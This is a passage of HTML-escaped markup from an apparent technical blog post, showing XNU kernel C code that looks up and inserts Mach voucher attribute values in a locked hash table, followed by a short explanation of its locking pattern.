 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_next &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_next&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* found it? */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_HASH_END&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* only add reference on non-persistent value */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_persist&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* insert new entry in the table */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_freelist&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IV_FREELIST_END &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* freelist empty */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_grow_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;goto&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;restart&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* take the entry off the freelist */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_freelist &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_next&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* initialize the new entry */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_free &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_persist &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;flag &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_PERSIST&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;TRUE &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* insert the new entry in the proper hash chain */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_next &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;hash_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;hash_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* donated passed in ivac reference to new entry */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;You&amp;#39;ll notice that this code has a very similar structure to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;; it needs to do almost exactly the same thing. Under a lock (this time the controller&amp;#39;s lock) traverse a hash table looking for a matching value. If one can&amp;#39;t be found, allocate a new entry and put the value in the hash table. The same unlock/lock dance is needed, but not every time because &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;#39;s are kept in a table of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;struct ivac_entry_s&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;#39;s so the lock only needs to be dropped if the table needs to grow.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
